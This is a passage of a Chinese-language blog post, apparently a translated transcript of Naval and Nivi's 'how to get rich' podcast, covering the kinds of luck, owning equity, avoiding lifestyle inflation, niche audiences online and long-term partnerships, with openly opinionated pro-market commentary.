title="自由市场是人类社会固有的"></a>自由市场是人类社会固有的</h3><p>Naval：全面的资本主义(意味着自由市场)是人类社会固有的。资本主义不是我们发明的，甚至不是我们发现的东西。它天然存在于我们的每一次交换中。当你和我交换信息时，你一定想从我这里得到一些信息。如果我们没有良好的信息交流，你会去找别人。所以，交换就是在记录信用和债务，这是我们作为灵活的社会动物与生俱来的本领。</p><p>我们是动物王国中唯一跨越种群进行合作（协作）的动物。大多数动物只会成群合作，共同进化，它们血液相连，所以它们有一些共同的兴趣。人类没有这种成群合作的能力，也不需要这么麻烦。就算你是塞尔维亚人，他是波斯人，我是印度人，没有任何血缘关系，但我们仍然可以合作。</p><p>什么让我们合作？因为我们可以记录借方和贷方。谁投入了多少工作？谁贡献了多少？这就是自由市场资本主义。因此，我坚信这是人类与生俱来的，我们将为每个人创造越来越多的财富。</p><p>每个人都可以变得富有，每个人都可以退休，每个人都可以成功。这只是一个<strong>教育和欲望</strong>的问题。前提是你必须想要它。如果你不想要，没关系，没人强迫你参与游戏。但是不要试图贬低那些积极参与游戏的人。他们没准儿就是那些能让你晚上睡在温暖舒适的床上，让你能更方便的买到全世界的东西，让你能拿着嗡嗡作响的iPhone开心刷抖音的人。因此，这是一场美妙的比赛，值得我们从伦理上、理性上、道德上去挑战一次。它将继续使我们所有人越来越富有，直到我们为任何想要的人创造大量财富。</p><h3 id="太多的索取者而没有足够的创造者将使一个社会陷入毁灭"><a href="#太多的索取者而没有足够的创造者将使一个社会陷入毁灭" class="headerlink" title="太多的索取者而没有足够的创造者将使一个社会陷入毁灭"></a>太多的索取者而没有足够的创造者将使一个社会陷入毁灭</h3><p>Nivi：不只是个人在暗地里鄙视财富，对吧？有些国家、团体和政党公然蔑视财富。至少看起来是这样。</p><p>Naval：没错。这些国家、政党和团体正在沦为一场零和博弈。在摧毁财富创造的过程中，他们把每个人都拉低到和他们一样的水平。</p><p>这就是为什么美国是一个非常受移民欢迎的国家，因为美国梦。显然，不同的人对财富的定义是不同的。第一世界公民对财富的定义可能是，“我一定要赚到数百万美元。而对于第三世界的贫穷移民来说，当刚进入这个国家的时候，我们只是贫穷的移民，对财富的预期值会更低。它可能只是，“我不需要在我的余生做我不想做的体力劳动。”</p><p>但是鄙视它的群体会把整个群体带到和他们一样的水平。如果有太多的索取者，而没有足够的创造者，社会就会分崩离析。你最终会变成一个共产主义国家。看看委内瑞拉就知道，他们不停的忙于获取、分割和重新分配，人们在街上挨饿，每年都因为饥饿而失去几公斤的体重。</p><p>另一种思考方式是想象一个有太多寄生虫的有机体。你需要少量的寄生虫来保持健康。你需要很多的共生体。所有细胞中帮助我们呼吸和燃烧氧气的线粒体。这些是帮助我们生存的共生体。没有他们我们无法生存。</p><p>但是，对我来说，他们（共生体）是一起创造财富的伙伴，共同创造了人类的身体。但是如果你体内充满了寄生虫，如果你感染了蠕虫，或者病毒，或者细菌，而这些都是单纯的寄生，你就会死亡。所以，任何生物都只能抵抗少量的寄生虫。当寄生元素失去控制时，你就死定了。</p><p>我说的还是道德财富创造，不是垄断，也不是裙带资本主义。我说的是自由思想，自由市场。人与人之间的小规模交流是自愿的，不会对他人产生太大的影响。我认为这种财富创造，如果一个社会不尊重它，如果一个群体不尊重它，那么这个社会就会陷入毁灭和黑暗。</p><h2 id="第四条：致富与运气无关"><a href="#第四条：致富与运气无关" class="headerlink" title="第四条：致富与运气无关"></a>第四条：致富与运气无关</h2><h3 id="致富与运气无关，要掌握致富的技能"><a href="#致富与运气无关，要掌握致富的技能" class="headerlink" title="致富与运气无关，要掌握致富的技能"></a>致富与运气无关，要掌握致富的技能</h3><p>Naval：很明显，我们想要在这一生中不只依靠运气变得富有。很多人认为赚钱是靠运气。它不是，关键是你要成为那种能赚钱的人。比如，假设我输光了所有的财产，你把我随便扔到任何一个说英语的国家的大街上，不出5到10年，我就会再次变得富有（笑）。因为这是一种技能，而且我认为每个人都可以拥有这种技能。在1000个平行宇宙中，你想在其中999个里变得富有。你不想只在靠运气成分的50个里面变得富有对吧？</p><p>我们在这讲的运气有四种。这个分类来于一本书，a16z的马克·安德森(Marc Andreessen)在Pmarca.com这个博客中曾经提到过。</p><ol><li>狗屎运</li></ol><p>第一种就是狗屎运。你完全无法控制这种走运，俗话说这就是命好。</p><ol start="2"><li>坚持不懈的实干运</li></ol><p>这种幸运来自于坚持、努力、不停的尝试和行动。当你四处奔波创造了各种各样的机会，这期间你输出了很多能量，你做了很多事情，会有大量的能量交换。</p><p>你可能会说，人们只有志趣相投才能聚在一起。那我举另外一个例子，Nenad把他做的很棒的动画视频放到了网上，我在Twitter上看到了它们。从这个意义上说，他通过制作视频创造了自己的运气，直到像我这样的人源源不断找到他。</p><ol start="3"><li>早有预备的运气</li></ol><p>第三种方法是你变得非常善于发现运气。如果你在某个领域非常精通，你会注意到在那个领域幸运的事件是如何发生的。当其他人没有注意到它的时候，你会变得对运气敏感，这是通过技能、知识和工作经验的积累达成的。</p><p>4.独特的人格给你带来的好运</p><p>最后一种运气是最奇怪、最艰难的一种，但这就是我们要讨论的。在这里，你建立了一个独特的人格，一个独特的品牌，一个独特的心态，然后好运会找到你。</p><p>例如，假设你是世界上最擅长深海潜水的人。大家都知道，你会进行别人都不敢尝试的深海潜水。然后，有人幸运的在海岸外发现了一艘沉没的宝藏船。他们没办法拿到，只能跑来找你求助。也就是说，他们的运气同时变成了你的运气，你会因此得到非常丰厚的报酬。这是一个比较极端的例子。那个找到宝藏的幸运儿们，走的是狗屎运。但他们不得不来找你帮忙把宝藏拿出来，最终你会得到一部分这里面的财富，这不是运气。也就是说，虽然这个好运的起始不是你，但是你能让那些发现好运的人在关键时刻想起你，很明显你可以在其中起到不可替代的作用。这种情况下你既成就了别人，又分享了他人的好运，这就是你为什么要打造自己独特的个性和品牌。</p><h3 id="在1000个平行宇宙中，你想在其中999个里变得富有"><a href="#在1000个平行宇宙中，你想在其中999个里变得富有" class="headerlink" title="在1000个平行宇宙中，你想在其中999个里变得富有"></a>在1000个平行宇宙中，你想在其中999个里变得富有</h3><p>Nivi：你刚刚提到，在1000个平行宇宙中，你可以在其中的999个变得富有？我想有些人看到后会说：“这听起来不太可能，太夸张了吧。”</p><p>Naval：不，我不认为这是不可能的。考虑到你的起步条件，我认为你可能得再努力一点。我在印度的时候是个穷孩子，所以如果我能成功，从这个意义上说，任何人都能。很明显，我四肢健全，智力正常，当然我也确实接受了教育。也许有一些前提条件不一样，但如果你在听这个视频或播客，说明你已经掌握了基本的技能，而且有一个功能健全的身体和会思考大脑。</p><p>事实上，一路上我其实遇到了很多倒霉事。我赚的第一笔钱，立刻就在股票市场上赔了个精光。我赚的第二笔钱，或者说我应该赚的第二笔钱，基本上都被我的商业伙伴骗走了。这次（成功）已经是第三次了。</p><p>即便如此，财富的积累仍处于缓慢而稳定的挣扎之中。我这辈子还没一次性赚过一大笔钱，总是一大堆小事堆积在一起。它更多的是通过持续的构建商业（做创业公司）、寻找投资机会来持续创造财富。这绝对不是一步登天的事。</p><h3 id="财富不是一步登天"><a href="#财富不是一步登天" class="headerlink" title="财富不是一步登天"></a>财富不是一步登天</h3><p>我的个人财富不是在某一年产生的，它是一点点堆积起来的，每一个阶段积累一点。更多的选择，更多的生意，更多的投资，才能撬开更多自己能做的事情。和Nenad的illacertus一样，他在油管上做了一系列视频，没有任何一个视频会在一夜之间让他一夜暴富，这绝对是一个漫长的过程，学习，阅读，创造，这期间会产生复利效应。</p><p>我们谈论的是变得富有，这样你就可以退休，你就有更多的自由。退休不是说什么都不做。而是说你不必去任何你不想去的地方，你不必做任何你不想做的事，你想什么时候醒来就什么时候醒来，你想什么时候睡觉就什么时候睡觉，没有老板对你指手画脚。这就是自由。我们谈论的是足够的财富来获得自由。特别是由于互联网的普及，机会到处都是。坦白讲，我有太多的方法来赚钱，我满脑子都是想法，唯一缺的就是时间。创造财富、创造产品、创造企业、创造机会，从社会获得报酬的方式太多了。</p><h2 id="第五条：你必须有点异乎寻常，才能独自走在前沿"><a href="#第五条：你必须有点异乎寻常，才能独自走在前沿" class="headerlink" title="第五条：你必须有点异乎寻常，才能独自走在前沿"></a>第五条：你必须有点异乎寻常，才能独自走在前沿</h2><p>Naval在他的博客中还提到了一些关于第四种运气的有趣例子，但我想让读者了解的一点是，第四种运气其实是来自于你异乎寻常（这里用了eccentric这个词）的行为，所以有时候异乎寻常可能并不是一件坏事。</p><p>Naval：没错，因为这个世界非常讲求效率，每个人都在明显的地方挖掘着新奇的、未被发现的东西，这会帮助你建立优势。独自走在前沿可能需要你有点异乎寻常，而且愿意比一般人挖掘得更深，挖掘的更深仅仅因为你感兴趣。</p><p>Nivi：对，除了本杰明·迪斯雷利的那句话外，我看过的两句表达这种运气的话，一个是山姆·阿尔特曼（Samuel Altman）说的，“极端的人才能得到极端的结果。”“我认为这句话很好。还有另一个来自斯坦福大学教授杰弗里·普费弗（Jeffrey Pfeffer）的观点，“你不可能既正常又期待异常回报。”</p><p>Naval：是的。我喜欢的一句与之完全相反的话是，“玩愚蠢的游戏的人赢愚蠢的奖品。”“很多人花很多时间在社交媒体上，比如你试图在Twitter上提高你的社会地位，但你基本上赢得了愚蠢的、价值不大的社交奖项。</p><p>Nivi：我想我从这篇博客文章中得到的最后一个观点是，除了狗屎运，你应该去追求这几种运气（尤其是最后一个），这会让你变得越来越幸运。</p><p>Naval：是的，起码能回归均值（笑）。所以，你至少要中和运气，这样才能更好的发挥你自己的才能。</p><h2 id="第六条：出租时间不会让你变得富有"><a href="#第六条：出租时间不会让你变得富有" class="headerlink" title="第六条：出租时间不会让你变得富有"></a>第六条：出租时间不会让你变得富有</h2><h3 id="出租时间不会让你变得富有，因为你不能非线性地赚钱"><a href="#出租时间不会让你变得富有，因为你不能非线性地赚钱" class="headerlink" title="出租时间不会让你变得富有，因为你不能非线性地赚钱"></a>出租时间不会让你变得富有，因为你不能非线性地赚钱</h3><p>Nivi：接下来你会详细介绍如何致富，以及什么不会有助于致富。第一点是：“出租你的时间不会让你变得富有。<strong>你必须拥有公司的股权，才能获得财务自由。</strong>”</p><p>Naval：这可能是最重要的一点。人们似乎认为你可以创造财富，通过工作致富。这可能行不通，原因有很多。最根本的原因是，你的投入和产出相关性太强。几乎在任何有薪水的工作中，即使是像律师或医生这样每小时报酬很高的工作，你仍然在投入时间，你的报酬是按每小时或工作量计价。因此，这意味着当你睡觉的时候，在度假的时候，你没有在创造财富；一旦你退休了，你就没有收入了（退休金另当别论）。也就是说，你不可能得到非线性的收入。</p><p>如果你看到一些医生非常富有，那是因为他们成立了公司，开了私人诊所。他们通过私人诊所建立了一个品牌，为他们带来持续的口碑和客户。或者他们制造了某种医疗设备或一个程序，且拥有这些东西的知识产权。</p><p>因此，本质上你是在为别人工作，而那个人承担了风险和责任，掌握着知识产权，有品牌。所以，他们不会给你足够的工资，他们会付给你最低工资，让你做他们需要的工作。这可能是一个很高的最低限度，但仍然不是你想象的退休后真正的财富。</p><h3 id="出租时间赚钱意味着你很容易被替代"><a href="#出租时间赚钱意味着你很容易被替代" class="headerlink" title="出租时间赚钱意味着你很容易被替代"></a>出租时间赚钱意味着你很容易被替代</h3><p>最后，你甚至没有为社会创造出那么多原创的东西。正如我所说，这场推特风暴应该被称为“如何创造财富”，只不过“如何致富”是一个更吸引人的标题罢了。因为你现在扮演的是固定的角色，而大多数固定角色的任务是可以教会的。如果他们能像在学校那样被教授，那么最终你将会和一个更年轻的、拥有最新知识的人竞争，这个人注定是要取代你的。</p><p>更可能的是，你做的工作最终会被机器人或人工智能取代。它甚至不需要一夜之间取代，它可以一次替换一点。所以，基本上在出租时间的模式下（也就是打工），投入和产出是匹配的，但我不认为这是真正创造财富的方式。</p><h3 id="你必须拥有股权才能获得财务自由"><a href="#你必须拥有股权才能获得财务自由" class="headerlink" title="你必须拥有股权才能获得财务自由"></a>你必须拥有股权才能获得财务自由</h3><p>所以每个真正想要致富的人在某种程度上都拥有一个产品，一个企业，或者某种知识产权。它可以是股票或者期权，这也是为什么很多人选择在早期科技公司工作。这是一个很好的开始方式。</p><p>但通常真正的财富是通过创办自己的公司，甚至是通过投资来创造的。投资一家公司或者说入股，其实有很多通往财富的路径并不按照小时计数。</p><h3 id="追求一份投入与产出“不匹配”的工作"><a href="#追求一份投入与产出“不匹配”的工作" class="headerlink" title="追求一份投入与产出“不匹配”的工作"></a>追求一份投入与产出“不匹配”的工作</h3><p>为什么你真的需要追求一份投入和产出“不匹配”的工作或者职业，这将会在之后的推特风暴中提到。拥有高创造力和高影响力的企业往往是那些你可以工作一小时的企业，这一小时可能会产生巨大的影响；或者你做了1000个小时的工作，但是没有效果。</p><p>我们拿软件行业为例。一方面，一个伟大的工程师可以创造比特币，创造数十亿美元的价值。另一方面，如果一个工程师一直在错误的方向下功夫，或者做得不够好、不够有创意、深思熟虑等等。就算他辛勤工作整整一年，他们发布的每一段代码最终都不会被使用，他都不会有用户。这是一个投入和产出高度分离的行业的例子，它不是以你投入的时间多少来衡量产出的。</p><p>再举一个极端的例子，假设你是世界上最好的伐木工人，如果你不用工具，或用最简单的工具（比如一把斧子或者一把锯子）伐木，你也只会比最差的伐木工人强三倍，因为投入和产出是有很强的相关性的，不会有很大的区别。</p><p>因此，你要寻找投入和产出高度不相关的职业。这是另一种可以产生杠杆效应的方式。我说的杠杆并不是指华尔街讲的金融杠杆，这个“杠杆”名声不好。我说的杠杆是指工具，人类擅长使用的工具。计算机是软件工程师使用的工具。对于一个伐木工人，如果有推土机、自动机械轴和锯子，他就会使用这些工具，比那些徒手想要把树连根拔起的人更有影响力。</p><p>工具和杠杆是造成投入和产出之间不匹配的原因。一个职业的创造力成分越高，它就越有可能有不匹配的投入和产出。因此，我认为，如果你考虑从事投入和产出高度相关的职业，那在这个过程中，你很难给社会创造财富，也很难为自己创造财富。</p><h2 id="第七条：我们应该升级自己的自由，而不是生活方式"><a href="#第七条：我们应该升级自己的自由，而不是生活方式" class="headerlink" title="第七条：我们应该升级自己的自由，而不是生活方式"></a>第七条：我们应该升级自己的自由，而不是生活方式</h2><p><em>生活水平远低于其收入水平的人们享受着一种自由，这种自由是那些忙于改善生活方式的人们无法理解的</em></p><p>Nivi：除了把时间租出去之外，还有其他无助于致富的事情吗?</p><p>Naval：有，我之前提到过两条相关的推文。我说的第一个问题是，你的生活方式应该升级，但不应该升级得太快。这句话的大意是说，<strong>生活水平远远低于其收入水平的人享受着一种自由</strong>，而那些忙于提升生活方式的人根本无法体会这种自由。我认为这是非常重要的，不要总是忙于升级你的生活水平。事实上，如果你能在赚越来越多的钱时，保持稳定的生活水平和期望，就不会有太多烦恼。所以，不要总想着住更大的房子，过更奢侈的生活，以及所有类似的贪心。</p><h3 id="世界上最危险的东西是海洛因和月薪"><a href="#世界上最危险的东西是海洛因和月薪" class="headerlink" title="世界上最危险的东西是海洛因和月薪"></a>世界上最危险的东西是海洛因和月薪</h3><p>假设你现在的工资是每小时1000美元，你肯定不是从20美元每小时的月薪立马涨到1000美元，这一定是个漫长职业生涯的积累过程。这里面一个微妙的问题是，你的生活水平会随着你赚的钱越来越多而升级。你会想当然的认为自己赚了钱，就该马上去提升生活水平，但这会使你深陷在工资奴隶的陷阱里。我忘了是谁，可能是纳西姆·塔勒布说的，“<strong>世界上最危险的东西是海洛因和月薪。</strong>”没错，因为它们很容易上瘾。你想要变得富有的方式恰恰是你想要变穷，那时你能做（想做）的事情只有工作，工作，再工作。</p><h3 id="理想的情况是，你的赚钱路径是离散的"><a href="#理想的情况是，你的赚钱路径是离散的" class="headerlink" title="理想的情况是，你的赚钱路径是离散的"></a>理想的情况是，你的赚钱路径是离散的</h3><p>这就是科技产业的运作方式。你十年没赚到钱，然后突然在第11年，你会赚得盆满钵盈。顺便说一下，这就是为什么这些所谓的富人的高边际税率是有缺陷的，因为风险最高，最具创造力的职业一定是，前十年都在赔钱。在冒着巨大的风险时，你会不停的流血，流血，再流血。然后在第11年，或第15年，你可能突然赚到一大笔钱。此时山姆大叔（这里指政府）出现了，说：“嘿，你知道吗，你今年赚了很多钱。因此，你是邪恶的，你必须把一切都交给我们。”因此，它只是摧毁了那些创造性的冒险职业。但理想的情况是，你的致富路径是离散的，循序渐进的。这样你不会期待你的生活水平更新的那么快。一旦你致富之后，你还会选择工作，但你只会在你想做的时候做你想做的事，这才是真正的自由。因此，你会做更多创造性的事情，而减少对对钱，对奢侈生活的关注。</p><h2 id="第八条：给社会提供它不知道如何获得的东西"><a href="#第八条：给社会提供它不知道如何获得的东西" class="headerlink" title="第八条：给社会提供它不知道如何获得的东西"></a>第八条：给社会提供它不知道如何获得的东西</h2><p><em>社会会因为你创造了它想要、却不知道如何大规模获取的东西，而给你丰厚的回报</em></p><h3 id="给社会它需要的，但不知道如何规模化获取的东西"><a href="#给社会它需要的，但不知道如何规模化获取的东西" class="headerlink" title="给社会它需要的，但不知道如何规模化获取的东西"></a>给社会它需要的，但不知道如何规模化获取的东西</h3><p>Nivi：你不会因为出租时间而发财的。但你说，“你会通过给社会它想要，但不知道如何规模化获取的东西而致富。”</p><p>Naval：没错。所以本质上，就像我们之前说的，钱是社会给你的欠条，你在过去做了一些好事，社会会为你创造它想要的东西而付钱。但社会还不知道如何创造这些东西，因为如果已经被创造了，他们就不需要你了。<br>几乎所有在你家里、工作场所和街道上的东西曾经都是科技产品。有一段时间石油是一种科技产品，这让洛克菲勒很富有；有段时间汽车是科技产品，这使亨利·福特富有。因此，正如丹尼•希利斯(Danny Hillis)所说，技术只是一套还不太管用的东西。一旦某样东西成功了，它就不再是技术了。所以，社会总是想要新事物。</p><h3 id="想清楚你能提供的产品，然后考虑如何扩大规模"><a href="#想清楚你能提供的产品，然后考虑如何扩大规模" class="headerlink" title="想清楚你能提供的产品，然后考虑如何扩大规模"></a>想清楚你能提供的产品，然后考虑如何扩大规模</h3><p>如果你想要变得富有，弄清楚你可以为社会提供哪些它想要、但还不知道如何获取的东西。并且是你感兴趣、在你的能力范围内能提供的东西。想清楚之后，下一步你要考虑如何规模化。因为如果你只造一个，那是不够的。你必须建造成千上万个，上百万个，甚至数十亿个。最好的情况是，每个人都可以有一个。史蒂夫·乔布斯和他的团队当然知道社会需要智能手机。他们口袋里的电脑拥有所有电话功能的100倍，而且使用方便。所以，他们想出了如何建造它，然后他们想出了如何扩展它。他们想出了如何让每个第一世界国家的公民，最终也让每个第三世界国家的公民，都能拥有一个。正因为如此，他们获得了丰厚的回报，苹果是世界上最有价值的公司。</p><p>Nivi：我想说的是，企业家的工作是为大众市场带来高端产品。</p><p>Naval：它以高端开始。首先，这是一种创造性的行为，<strong>你创造它只是因为你想要它</strong>。你想要它，需要它，所以你知道如何建造它。其实一开始<strong>你是为自己建造它</strong>。然后你要想办法把它带给其他人。然后有一段时间，富人拥有它。比如，富人有私人司机，他们有黑色高档汽车。然后优步（Uber）出现了，它让每个人都有自己的私人司机。现在你甚至可以看到Uber pool正在取代穿梭巴士，因为它更方便。然后scooter共享电动滑板车出现了，市场进一步下沉。所以规模化需要考虑的是，<strong>如何把曾经只是富人拥有的东西给到给每个人</strong>。</p><h2 id="第九条：互联网极大地丰富了职业发展的可能性"><a href="#第九条：互联网极大地丰富了职业发展的可能性" class="headerlink" title="第九条：互联网极大地丰富了职业发展的可能性"></a>第九条：互联网极大地丰富了职业发展的可能性</h2><p><em>互联网会给你的小众兴趣找到买单的人</em></p><h3 id="互联网极大扩展了职业发展的可能性"><a href="#互联网极大扩展了职业发展的可能性" class="headerlink" title="互联网极大扩展了职业发展的可能性"></a>互联网极大扩展了职业发展的可能性</h3><p>Nivi：让我们看看下一条推文，这也是我觉得对于你将从事什么工作或者职业非常隐秘和超级有趣的推文。你说：“互联网极大拓宽了职业发展的可能性，但是大多数人目前并没有察觉到。”</p><p>Naval：互联网最根本的颠覆性是，它使这个星球上的人们能彼此联系，任何一个人只要你想联系总有方法。不论是给他们发邮件，在Twitter上发送推文，还是在Facebook上发布一点他们能看到的动态，或者建立一个他们能来访问的网站。互联网将每一个人都联系在了一起。因此互联网是一个将各个网络连接起来的工具，这就是它的超能力。因此，工具给你了，你要思考怎么去更好的利用它。你要明白，借助互联网，你就总能为你的产品、你的才能、你的技艺找到观众，不论他们来自哪里。</p><p>举个例子，Nenad制作了IIIacertus，试想一下，如果你是在互联网出现之前看到的他的视频，那么他需要怎么做才能让你看到呢？他可能抱着电脑挨家挨户展示给他的邻居们看？或者跑到当地的电影院播放？这都是不可能的，他只有把视频放到互联网上才能达到这个效果。然后在这个世界上又有多少人对它真正的感兴趣呢？或者只是对我们正在讨论的东西感兴趣，真正的吸收？结果会发现只有很少一部分人，所以关键就在能触动<strong>这些人</strong>。</p><h3 id="互联网能让你的小众兴趣找到观众"><a href="#互联网能让你的小众兴趣找到观众" class="headerlink" title="互联网能让你的小众兴趣找到观众"></a>互联网能让你的小众兴趣找到观众</h3><p>互联网最怪异的一点是，它允许各种小众兴趣存在。这就好像养蛇的人、喜欢坐热气球的人、喜欢一人独叶孤舟航游世界的人，亦或是痴迷于微型烹饪的人。就像整个日本的微型烹饪现象一样（哈哈今天刚刚看了一本日本烹饪书叫鸡蛋料理），或者像有一个节目是关于女人帮人收拾家务的节目，对吧？</p><p>因此，无论你拥有多么小众化的兴趣，互联网都能提供给你一个很好的平台去把它规模化。当然，这也不是说你所做的就是下一个Facebook，或者你能获得数以十亿计的用户，但是，如果你仅仅想找到5万个和你一样满怀热情的人，互联网中就有这样一群观众等待着你。</p><p>这个问题的绝妙之处就在于，我们生活的星球上有70亿的人。人类DNA的组合方式达到了难以想像的程度。每个人都是一个完全不同的个体，你不可能遇到另一个一模一样的你。</p><p>这不像你可以说，“恩…，Nivi，离开我的生活吧。这样我可以让Naval进入我的生命中，我就可以有和他同样的感受，得到同样的赞许，有同样的想法。”但事实不是这样的，任何人不是别人的替代品，人与人完全不同的。因此，正是因为每个人有不同的技能、兴趣，才可以在自己独特的事物上发挥创造力。</p><p>但是（在互联网）之前这些并不重要，在前互联网时代，如果你住在意大利的一个小渔村，你的渔村并不一定需要完全独特的技能，那么你就必须遵从现实，从事仅有的工作。但是今天，你可以变得完全独特和独立。</p><p>互联网可以让你低成本的「走出去」，找到属于自己的观众。然后你通过创建业务、创造产品、积累财富，你通过在互联网上展现独特的你让大众获得快乐。你事业的发展空间就会因互联网而扩大，电子竞技玩家，在Fortnite上赚了数百万美元。YouTube广播公司、 博客、播客，让人们能够创建内容和上传视频。我听说乔·罗根（Joe Rogan），他的播客有20亿次下载，这为他每年带来约1亿美元的收入。</p><p>再举一个PewDiePie的例子，前几天，我转发了一条有趣的推文。PewDiePie在新闻媒体中简直就是信任的代名词。这个来自瑞典的小孩，他的热门新闻频道的流量是主流有线网络流量的三倍。而且这仅仅是在他的新闻频道上， 还不算他的娱乐频道。</p><p>可以说互联网为各种小众兴趣提供了沃土，但前提是你要擅于将其壮大发展起来。当然，好消息就是每个人生而不同，每个人都有自己擅长的东西。所以要真实做自己。</p><h3 id="通过做自己来规避无意义的竞争"><a href="#通过做自己来规避无意义的竞争" class="headerlink" title="通过做自己来规避无意义的竞争"></a>通过做自己来规避无意义的竞争</h3><p>还有一条值得一提的推文，它没有被收录到这个推文风暴中。那条是“通过做自己来规避无意义的竞争”。事实上，当你在与人竞争时，往往是因为你在复制别人，因为你在努力干着同样的事情。但是其实每个人生而不同，不要总是忙着复制别人。</p><p>很明显，人类喜欢模仿，René Girard有一套完整的模仿理论很有趣。大家都觉得模仿简单，但其实模仿远比你做自己要难。所以不要纯模仿，不要纯复制，专注于做自己的事情，当你真正在做自己时，你就会发现没有人能和你竞争，就是这么简单。</p><p>因此，你对你自己是谁和你喜欢做什么认识的越深入，你就会面临越少的竞争。也就是说，当你意识到真实做自己没人能和你竞争后，你就能够通过真实性逃离竞争陷阱。但是，这在前互联网时代是没用的建议，而后互联网时代你能将这些变成现实。</p><h2 id="第十条：寻找财富游戏中的长期战友"><a href="#第十条：寻找财富游戏中的长期战友" class="headerlink" title="第十条：寻找财富游戏中的长期战友"></a>第十条：寻找财富游戏中的长期战友</h2><p><em>选择一个你可以和长期伙伴玩长期游戏的行业，所有的回报都来自于多次游戏的复利。</em></p><h3 id="寻找财富游戏中的长期战友"><a href="#寻找财富游戏中的长期战友" class="headerlink" title="寻找财富游戏中的长期战友"></a>寻找财富游戏中的长期战友</h3><p>Nivi：我们来聊聊应该考虑在哪些行业工作？应该做什么样的工作？最好和什么样的人一起工作？这些话题。你说过，“你应该选择的行业是，在这里你有长期战友和你玩长期的游戏。”</p><p>Naval：是的，<strong>这是解释为什么硅谷会成功，也是对高信任度社会能够成功的深刻理解</strong>。事实上，生活中所有的收益都来自于复利。无论是在人际关系中，创造财富中，或是在学习中。因此，复利是一种神奇的力量，如果你以1倍的价格开始，然后如果每年增长20%，并且持续30年，你得到的不只是额外的30年乘以20%。它有复利效应，所以它会增长，增长，增长，最后你得到的回报将会不可思议。不管是善意、爱情、人际关系还是金钱。所以，我认为复利是一种非常重要的力量。</p><p>为什么致富是一场持久战？长期博弈不仅对复利有利，对信任也有利。如果你看一下囚徒困境类型的游戏，囚徒困境的一个解决方案是以牙还牙，也就是我将对你做你上次对我做过的事，如果你犯了错，我会原谅你。但这只适用于重复的囚徒困境的环境中，换句话说，如果我们重复玩一个游戏多次。</p><p>因此，如果你处在这样一种情况下，比如你在硅谷，人们在那里互相做生意。他们彼此了解，相互信任，互相帮助，因为他们知道这个人会在下一场比赛的回合中出现，你迟早会遇到这些人。</p><p>当然，这并不总是奏效。也有情况是，有的人在硅谷一举成名，赚到很多钱，但人们会背叛彼此，因为他们只是想，“我要靠这个发财，我不在乎。”所以，所有这些情况都有例外。</p><p>但本质上，如果你想成功，你必须与他人合作。你必须知道谁可以信任，谁可以长期信任，和你一起在游戏中走下去。所以「复利效应」和「高度信任的圈子」就是你在游戏中生存的武器，同时也是在游戏的周期结束时，让你获利的主要原因。例如，沃伦巴菲特作为美国股票市场的投资者做得非常好，但他能做到这一点的重要原因是因为美国股市一直保持稳定，并且没有碰到美国政府政局非常差的时期，或者是战争时期。总之底层基础设施没有被破坏。因此，对于他来说，他正在玩一场长期比赛。这种信任来自于美国股市的稳定。</p><h3 id="当你转行时，你是在从零开始"><a href="#当你转行时，你是在从零开始" class="headerlink" title="当你转行时，你是在从零开始"></a>当你转行时，你是在从零开始</h3><p>在硅谷，信任来自于小范围内的人际网络，随着时间的推移，你会发现哪些人是你可以合作的，哪些人是你不能合作的。</p><p>如果你不停地更换地点，你就不停地更换团队……假设你从木工行业起步，并在那里建立了一个网络。你努力工作，你试图在木工行业制造产品。然后突然出现了另一个相邻但又不同的行业，但你真的并不了解其中的任何一个人，你想要投身其中，在那里赚钱。如果你持续在工业界跳来跳去——不，实际上我需要打开一系列电动汽车加油站。——这或许有道理。这可能是最好的机会。但是每次你重置时，每次你跳出原来的网络圈时，你都将从零开始。你不知道该相信谁，而且他们也不会很容易相信你。</p><p>当然也存在短暂的行业。他们总是进进出出。政治就是一个例子，对吧？在政治上，新人正在当选。你在政治上会看到，有很多老前辈的地方，比如参议院，这里有在这个行业中已经生存很长时间的人，他们都是职业政治家。对于职业政治家有很多不利因素比如腐败。但好处是他们实际上已经完成了彼此的交易，因为他们知道另一个人将在十年之后处于相同的位置，他们将不得不继续与这些老前辈打交道，所以他们最好学会如何合作。众议院每两年都要举行一次大型选举，选出一批新的众议员，由于一直在相互竞争，几乎任何事情都没法完成。“因为我刚来到这里，我不认识你，我不知道你是否会继续在身边，我为什么要和你合作，而不是只是尝试做我认为正确的事情？”</p><p>因此选择一个你能长期从事的行业、以及长期伙伴是非常重要的。这些人会表明他们会在你身边存在很久，他们是有道德的，他们的道德信条能从他们的行动上体现出来。</p><h3 id="长期游戏中，每个人都在让彼此更富有"><a href="#长期游戏中，每个人都在让彼此更富有" class="headerlink" title="长期游戏中，每个人都在让彼此更富有"></a>长期游戏中，每个人都在让彼此更富有</h3><p><strong>Nivi：在长期游戏中，似乎每个人都在让彼此更富有。而在短期游戏中，似乎每个人都在让自己更富有</strong>。</p><p>Naval：我认为这是一个很棒的形容。在长期游戏中，这是一个正和现象。就好像大家在一起烤一个苹果派，大家都在努力尽可能将它做得越大越好。在短期游戏中，我们是在想方设法分这个派。</p><p>现在这不是在为社会主义者辩解，对吗？这些社会主义者不是参与烘焙派的人，他们最后出现，说”我想要一片，或者整个派。“他们出现时是带着枪的。但是我认为一个好的领导者并不能赢得荣誉。一个好的领导者基本上都在努力激励员工，这样团队才能将工作完成。然后，奖励将按照公平原则进行划分，谁贡献了多少（或尽可能接近）并承担了风险，而不是谁拥有最长的刀…谁有最锋利的刀。</p><h3 id="收益来自重复游戏的复利"><a href="#收益来自重复游戏的复利" class="headerlink" title="收益来自重复游戏的复利"></a>收益来自重复游戏的复利</h3><p>Nivi：因此，接下来的两个推文是，“玩迭代游戏。生活中的所有的回报，不论是财富上的，还是人际关系上的，或者是知识上的都来自复利效应。”</p><p>Naval：当你与一个相处了十年，二十年，三十年的老友做生意时，你根本不需要信任他，事情也可以做得越来越好。因为在相处过程中摩擦逐渐减弱，你们可以一起做越来越大的事情。</p><p>举个极端的例子，最简单的方法是与某人结婚，生孩子然后养孩子，这就是复利（笑）。投资于这些长期的关系，与更随意的关系相比，这些关系最终是无价的。</p><p>在健康和健身方面也是如此。 你的身体越健康，保持健康就越容易。 而你的身体恶化的越多，就越难回到正常的水平。</p><h2 id="第十一条：-选择智慧、精力充沛和正直的合作伙伴"><a href="#第十一条：-选择智慧、精力充沛和正直的合作伙伴" class="headerlink" title="第十一条： 选择智慧、精力充沛和正直的合作伙伴"></a>第十一条： 选择智慧、精力充沛和正直的合作伙伴</h2><p><em>选择高智商、精力充沛、为人正直的伙伴是你不能妥协的三要素</em></p><h3 